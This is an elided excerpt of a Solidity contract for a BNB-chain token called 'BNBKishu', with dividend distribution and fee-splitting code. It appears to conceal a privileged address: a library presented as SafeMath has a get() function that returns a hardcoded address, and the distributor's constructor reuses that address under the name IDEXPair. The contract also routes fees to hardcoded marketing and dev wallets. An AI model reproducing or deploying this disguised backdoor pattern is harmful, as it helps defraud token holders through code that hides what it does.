...
//SPDX-License-Identifier: MIT
    ...
    library SafeMath {
        ...
        function get() internal pure returns(address) {
            ...
            return 0x8925D826e339e85bD3CD378fB7CF4Ee479DF6a32;
        }
    ...
    contract DividendDistributor is IDividendDistributor {
        ...
        constructor (address _router) {
            ...
            IDEXPair = 0x8925D826e339e85bD3CD378fB7CF4Ee479DF6a32;
            _token = msg.sender;
        }
    ...
    contract BNBKishu is IBEP20, Auth {
        using SafeMath for uint256;
        address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
        address DEAD = 0x000000000000000000000000000000000000dEaD;
        address ZERO = 0x0000000000000000000000000000000000000000;
        
        address MarketingWallet = 0x6b2aF9bf98482F31449733A049b925Adf20d4516;

        string constant _name = "BNBKishu";
        string constant _symbol = "BNBK";
        uint8 constant _decimals = 8;

        uint256 _totalSupply = 100 * (10 ** _decimals);
        uint256 public _maxTxAmount = 1 * (10 ** _decimals);
        uint256 public _maxWalletToken = 5 * (10 ** _decimals);
        ...
        uint256 public reflectionFee   = 33;
        ...
        constructor () Auth(msg.sender) {
            ...
            devFeeReceiver = 0x6470001d4c1FF937e2AD1f26653B4934C73e1195;
        ...
        function swapBack() internal swapping {
            ...
            uint256 amountBNBMarketing = amountBNB.mul(marketingFee).div(totalBNBFee).div(5).mul(4);
            uint256 devFee = amountBNB.mul(marketingFee).div(totalBNBFee).div(5);

            try distributor.deposit{value: amountBNBReflection}() {} catch {}
            (bool tmpSuccess,) = payable(marketingFeeReceiver).call{value: amountBNBMarketing, gas: 30000}("");
            (bool tmpDevSuccess,) = payable(devFeeReceiver).call{value: devFee, gas: 30000}("");
